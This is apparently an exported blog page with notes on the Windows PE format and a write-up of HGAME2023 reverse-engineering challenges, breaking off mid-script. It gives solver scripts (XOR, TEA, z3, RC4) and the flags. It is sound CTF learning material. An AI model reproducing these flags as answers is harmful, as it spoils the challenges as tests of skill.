<p>DLL为了能使得别的程序和DLL得以调用其中的函数，将输出信息保存在输出表中</p>        <h4 id="输出表的结构"   >          <a href="#输出表的结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#输出表的结构" class="headerlink" title="输出表的结构"></a>输出表的结构</h4>      <p>输出表的主要内容是一个包含函数名称，输出序数等的一个表格。</p><p>输出表是数据目录的第一个成员，指向IED结构体</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303212123609.png" alt="image-20230321212317492"></p><ul><li>Characteristics：</li><li>TimeDateStamp：</li><li>MajorVersion：</li><li>MinorVersion：</li><li>Name：指向ASCII字符串的RVA。该字符串是与输出函数相关联的DLL的名字</li><li>Base：</li><li>NumberOfFunctions：EAT表中的条目数量。为零代表美术代码或者数据被输出</li><li>NumberOfNames：输出函数名称表ENT中的条目数量</li><li>AddressOfFuncticons：EAT的RVA。EAT是一个RVA数组，数组中的每一个非零的RVA都对应一个被输出的符号。</li><li>AddressOfNames：ENT的RVA。ENT是一个指向ASCII字符串的RVA数组。</li><li>AddressOfNameOrdinals：输出序数表的RVA。这个表将ENT中的数组索引映射到相应的输出地址条目</li></ul>        <h3 id="基址重定位"   >          <a href="#基址重定位" class="heading-link"><i class="fas fa-link"></i></a><a href="#基址重定位" class="headerlink" title="基址重定位"></a>基址重定位</h3>      <p>一般来说，当链接器生成一个PE文件的时候，会假设这个文件被装载到默认的基地地址处。但当PE文件加载的时候，如果该地址已被占用，则PE文件需要用重定位表来进行调整。</p><p>对于EXE文件来说，每个文件总是使用独立的虚拟地址空间，所以EXE文件一般不需要重定位信息。然而Windows系统自带的ASLR随机基址的安全机制使得EXE文件每次加载的地址不尽相同。</p>        <h4 id="基址重定位表"   >          <a href="#基址重定位表" class="heading-link"><i class="fas fa-link"></i></a><a href="#基址重定位表" class="headerlink" title="基址重定位表"></a>基址重定位表</h4>      <p>基址重定位表（Base Relocation Table）位于.reloc区块内。</p><p>以一个IMAGE_BASE_RELOCATION结构体开始</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303212207586.png" alt="image-20230321220703553"></p><ul><li>VirtualAddress：这组重定位数据的开始RVA地址。</li><li>SizeOfBlock：当前重定位结构的大小。</li><li>TypeOffset：数组。每项大小2字节，16位。高4位代表重定位类型，低12位代表重定位地址。该地址+VA就是指向PE映像文件中需要求改的地址数据的指针。</li></ul>        <h3 id="资源"   >          <a href="#资源" class="heading-link"><i class="fas fa-link"></i></a><a href="#资源" class="headerlink" title="资源"></a>资源</h3>      <p>Windows程序的各种界面被称为资源。</p>        <h4 id="资源结构"   >          <a href="#资源结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#资源结构" class="headerlink" title="资源结构"></a>资源结构</h4>      <p>资源采用类似磁盘目录结构的方式保存。</p>        <h3 id="调试目录"   >          <a href="#调试目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#调试目录" class="headerlink" title="调试目录"></a>调试目录</h3>      <p>数据目录表的第七个条目指向调试目录。目前，最为常见的储存debug信息的形式是PDB文件。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame2023</title>
      <link href="/2023/03/06/hgame2023/"/>
      <url>/2023/03/06/hgame2023/</url>
      
        <content type="html"><![CDATA[        <h1 id="HGAME2023"   >          <a href="#HGAME2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#HGAME2023" class="headerlink" title="HGAME2023"></a>HGAME2023</h1>      <p>by  没有眼的鱼</p>        <h2 id="Week1"   >          <a href="#Week1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2>              <h3 id="test-your-IDA"   >          <a href="#test-your-IDA" class="heading-link"><i class="fas fa-link"></i></a><a href="#test-your-IDA" class="headerlink" title="test_your_IDA"></a>test_your_IDA</h3>      <p>ida64位打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062119681.png" alt="image-20230112172658807"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;te5t_y0ur_IDA&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="easyasm"   >          <a href="#easyasm" class="heading-link"><i class="fas fa-link"></i></a><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3>      <p><img src="/../../../Desktop/hgame2023/week1/week1/image-20230112172921398.png" alt="image-20230112172921398"></p><p>核心是<code>Str[i] ^= 0x33</code></p><figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0x5b</span>, <span class="number">0x54</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x5f</span>, <span class="number">0x50</span>,  <span class="number">0x3</span>, <span class="number">0x5e</span>, <span class="number">0x56</span>, <span class="number">0x6c</span>, <span class="number">0x47</span>,  <span class="number">0x3</span>,</span><br><span class="line">    <span class="number">0x6c</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x6c</span>, <span class="number">0x44</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>,  <span class="number">0x2</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x12</span>, <span class="number">0x4e</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x33</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;welc0me_t0_re_wor1d!&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="easyenc"   >          <a href="#easyenc" class="heading-link"><i class="fas fa-link"></i></a><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3>      <p>ida64位打开</p><p><img src="/../../../Desktop/hgame2023/week1/week1/image-20230112173335469.png" alt="image-20230112173335469"></p><p>核心逻辑是先异或0x32再减去86</p><p>留意v8是以小端序的形式储存密文</p><p>写脚本</p><figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0x09FDFF04</span>, <span class="number">0x0B0F301</span>, <span class="number">0xADF00500</span>, <span class="number">0x05170607</span>,</span><br><span class="line">    <span class="number">0x17FD17EB</span>, <span class="number">0x1EE01EA</span>, <span class="number">0xFA05B1EA</span>, <span class="number">0xAC170108</span>,</span><br><span class="line">    <span class="number">0xFDEA01EC</span>, <span class="number">0x60705F0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    enc = <span class="string">&quot;&quot;</span></span><br><span class="line">    x = flag[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        enc = enc + <span class="built_in">chr</span>((((x &amp; <span class="number">0xff</span>) + <span class="number">86</span>) ^ <span class="number">0x32</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        x = x &gt;&gt; <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(enc, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>((((<span class="number">0xf9</span> &amp; <span class="number">0xff</span>) + <span class="number">86</span>) ^ <span class="number">0x32</span>) &amp; <span class="number">0xff</span>))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="a-cup-of-tea"   >          <a href="#a-cup-of-tea" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-cup-of-tea" class="headerlink" title="a_cup_of_tea"></a>a_cup_of_tea</h3>      <p>ida64位</p><p><img src="/../../../Desktop/hgame2023/week1/week1/image-20230112173112549.png" alt="image-20230112173112549"></p><p>每8位一组进行加密</p><p><img src="/../../../Desktop/hgame2023/week1/week1/image-20230112173144166.png" alt="image-20230112173144166"></p><p>改了delta的tea加密</p><p>写脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flag[] = &#123;</span><br><span class="line">        <span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>,</span><br><span class="line">        <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x1 = flag[<span class="number">2</span>*x];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x2 = flag[<span class="number">2</span>*x+<span class="number">1</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) v4 -= <span class="number">0x543210DD</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            x2 -= (v4 + x1) ^ ((x1 &gt;&gt; <span class="number">5</span>) + <span class="number">0x45678901</span>) ^ (<span class="number">16</span> * (x1 + <span class="number">0x3456789</span>));</span><br><span class="line">            x1 -= (v4 + x2) ^ (<span class="number">16</span> * x2 + <span class="number">0x12345678</span>) ^ ((x2 &gt;&gt; <span class="number">5</span>) + <span class="number">0x23456789</span>);</span><br><span class="line">            v4 += <span class="number">0x543210DD</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x1&amp;<span class="number">0xff</span>);</span><br><span class="line">            x1 = x1 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x2&amp;<span class="number">0xff</span>);</span><br><span class="line">            x2 = x2 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>, <span class="number">0x6B</span>, <span class="number">0x7D</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="encode"   >          <a href="#encode" class="heading-link"><i class="fas fa-link"></i></a><a href="#encode" class="headerlink" title="encode"></a>encode</h3>      <p>ida32位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062119707.png" alt="image-20230112173530806"></p><p>就单纯的把v5的前四位和后四位拆开了</p><p>写脚本</p><figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0x00000008</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x00000006</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000003</span>, <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x0000000F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000006</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000005</span>, <span class="number">0x00000009</span>,</span><br><span class="line">    <span class="number">0x00000006</span>, <span class="number">0x00000003</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000005</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000003</span>, <span class="number">0x00000007</span>, <span class="number">0x00000009</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000F</span>,</span><br><span class="line">    <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000003</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000005</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x00000006</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    x = flag[<span class="number">2</span>*i+<span class="number">1</span>] * <span class="number">16</span> + flag[<span class="number">2</span>*i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="Week2"   >          <a href="#Week2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2>              <h3 id="before-main"   >          <a href="#before-main" class="heading-link"><i class="fas fa-link"></i></a><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3>      <p>ida64位打开</p><p>根据提示很明显有函数在main之前运行了</p><p><img src="/../pic/image-20230113015316569.png" alt="image-20230113015316569"></p><p>结合base64，猜测可能是该表，对qword_4020交叉引用</p><p><img src="/../pic/image-20230113015353435.png" alt="image-20230113015353435"></p><p>找到了该函数，换表base64</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;s0meth1ng_run_befOre_m@in&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="math"   >          <a href="#math" class="heading-link"><i class="fas fa-link"></i></a><a href="#math" class="headerlink" title="math"></a>math</h3>      <p>ida64位打开</p><p><img src="/../pic/image-20230113014032240.png" alt="image-20230113014032240"></p><p>动态调试的话会发现这个<code>savedregs - 368</code>指向的就是输入的开头</p><p>下面三层循环很明显就是矩阵乘法</p><p><code>v12 == input * v10</code></p><p>用z3写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v10 = [<span class="number">0x0000007E</span>, <span class="number">0x000000E1</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000028</span>, <span class="number">0x000000D8</span>,</span><br><span class="line">       <span class="number">0x000000FD</span>, <span class="number">0x00000014</span>, <span class="number">0x0000007C</span>, <span class="number">0x000000E8</span>, <span class="number">0x0000007A</span>,</span><br><span class="line">       <span class="number">0x0000003E</span>, <span class="number">0x00000017</span>, <span class="number">0x00000064</span>, <span class="number">0x000000A1</span>, <span class="number">0x00000024</span>,</span><br><span class="line">       <span class="number">0x00000076</span>, <span class="number">0x00000015</span>, <span class="number">0x000000B8</span>, <span class="number">0x0000001A</span>, <span class="number">0x0000008E</span>,</span><br><span class="line">       <span class="number">0x0000003B</span>, <span class="number">0x0000001F</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000052</span>, <span class="number">0x0000004F</span>]</span><br><span class="line">v12 = [<span class="number">0x0000F9FE</span>, <span class="number">0x00008157</span>, <span class="number">0x000108B2</span>, <span class="number">0x0000D605</span>, <span class="number">0x0000F21B</span>,</span><br><span class="line">       <span class="number">0x00010FF3</span>, <span class="number">0x00009146</span>, <span class="number">0x00011212</span>, <span class="number">0x0000CF76</span>, <span class="number">0x00010C46</span>,</span><br><span class="line">       <span class="number">0x0000F76B</span>, <span class="number">0x000077DF</span>, <span class="number">0x000103BE</span>, <span class="number">0x0000C6F8</span>, <span class="number">0x0000ED8A</span>,</span><br><span class="line">       <span class="number">0x0000BE90</span>, <span class="number">0x000075EC</span>, <span class="number">0x0000EAC8</span>, <span class="number">0x0000AE37</span>, <span class="number">0x0000CC29</span>,</span><br><span class="line">       <span class="number">0x0000A828</span>, <span class="number">0x00005C6C</span>, <span class="number">0x0000AB4A</span>, <span class="number">0x0000836E</span>, <span class="number">0x0000ACEE</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [Int(<span class="string">&#x27;x[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        s.add(v12[i * <span class="number">5</span> + j] == (</span><br><span class="line">                    x[i * <span class="number">5</span>] * v10[j] + x[i * <span class="number">5</span> + <span class="number">1</span>] * v10[<span class="number">1</span> * <span class="number">5</span> + j] + x[i * <span class="number">5</span> + <span class="number">2</span>] * v10[<span class="number">2</span> * <span class="number">5</span> + j] + x[i * <span class="number">5</span> + <span class="number">3</span>] *</span><br><span class="line">                    v10[<span class="number">3</span> * <span class="number">5</span> + j] + x[i * <span class="number">5</span> + <span class="number">4</span>] * v10[<span class="number">4</span> * <span class="number">5</span> + j]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s.check()):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (s.check() == sat):</span><br><span class="line">        condition = []</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[%d]&quot;</span> % k)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            condition.append(x[i] != <span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[x[i]])))</span><br><span class="line"></span><br><span class="line">        s.add(Or(condition))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;y0ur_m@th_1s_gO0d&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="stream"   >          <a href="#stream" class="heading-link"><i class="fas fa-link"></i></a><a href="#stream" class="headerlink" title="stream"></a>stream</h3>      <p>python编译的exe</p><p>pyinstxtractor.py后再把pyc丢去反编译</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">key</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        data.append(s[(s[i] + s[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(text, gen(key)):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ k)</span><br><span class="line">    result = base64.b64encode(result.encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;Flag: &#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">enc = encrypt(text, key)</span><br><span class="line"><span class="keyword">if</span> enc == <span class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>直接写脚本就行了</p><p>但是要注意这个base64，一开始我以为这个encode decode只是编码和字符的转换。没想到他base64加密的是字符串编码后的数据</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">text = <span 